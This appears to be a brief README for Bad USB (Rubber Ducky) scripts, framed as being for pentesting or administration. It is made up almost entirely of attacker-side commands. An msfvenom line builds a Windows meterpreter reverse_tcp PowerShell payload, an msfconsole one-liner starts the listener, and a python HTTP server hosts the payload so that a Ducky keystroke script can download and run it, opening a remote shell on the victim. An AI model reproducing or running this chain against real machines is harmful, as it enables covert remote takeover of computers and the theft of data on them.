# Various Ducky scripts for Bad USBs
Can be used for pentesting or administrative tasks.
-
# On The Attacker's Machine
-
Create the payload with msfvenom 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=AttacksersIP LPORT=AttackersPort -f psh -o PAYLOAD.ps1
# Open msfconsole and start listener
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost IP; set lport PORT; set ExitOnSession false; exploit -j"
# Start start python http server
python3 -m http.server 80
# Ducky script will download and execute powershell script opening meterpreter session



